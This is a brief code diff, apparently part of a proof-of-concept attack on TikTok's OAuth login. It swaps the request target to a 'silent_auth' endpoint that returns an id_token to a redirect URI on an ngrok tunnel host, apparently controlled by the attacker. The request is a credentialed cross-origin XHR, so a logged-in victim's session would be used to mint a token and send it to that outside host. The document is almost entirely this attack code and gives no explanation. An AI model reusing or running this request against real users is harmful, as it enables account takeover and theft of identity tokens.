@@ -1,7 +1,7 @@
 var xhr = new XMLHttpRequest();
 
 xhr.onload = reqListener; 
-xhr.open("POST", "https://www.tiktok.com/passport/open/web/auth/v2/?client_key=awn32gkr1d27lv49&scope=user.info.basic%2Cuser.info.phone%2Cuser.info.email%2Cuser.info.profile%2Cuser.info.stats%2Cuser.info.username&aid=1459&redirect_uri=https%3A%2F%2Fseller-id.tiktok.com%2Faccount%2Foauth%2Ftt%2Fcallback&source=web&response_type=code");
+xhr.open("POST", "https://open-api.tiktok.com/oauth/silent_auth/?scope=openid&response_type=id_token&redirect_uri=https://832a-202-162-37-174.ngrok-free.app&state=n2HJBz1hmyv9l5hLWFIhnJM60ovpPz&nonce=zuDvLNJNYP2tAYvtceQZ7W&client_id=awhntrn8mar80rj0&response_mode=form_post");
 xhr.withCredentials = true;
 xhr.setRequestHeader("Content-Type", "application/json");
 xhr.send();
